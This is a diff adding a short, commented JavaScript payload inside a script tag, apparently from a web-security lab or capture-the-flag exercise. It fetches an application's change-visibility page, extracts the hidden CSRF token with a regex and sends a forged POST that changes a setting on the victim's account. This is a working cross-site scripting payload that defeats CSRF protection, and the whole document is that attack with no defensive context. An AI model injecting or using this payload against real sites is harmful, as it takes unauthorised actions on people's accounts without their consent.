@@ -1,0 +1,13 @@
+<script>
+var req = new XMLHttpRequest(); // req object
+req.onload = handleResponse; // when it loads execute the functions
+req.open('get','/app/change-visibility',true); // the endpoint to execute actions
+req.send(); // send the requests
+function handleResponse(d) { // defining function
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];  // aims to extract the csrf token from source
+    var changeReq = new XMLHttpRequest(); // request object
+    changeReq.open('post', '/app/change-visibility', true); // make a POST request to endpoint
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // set content-type
+    changeReq.send('csrf='+token+'&action=change'); // send the request to do the expected action
+};
+</script>
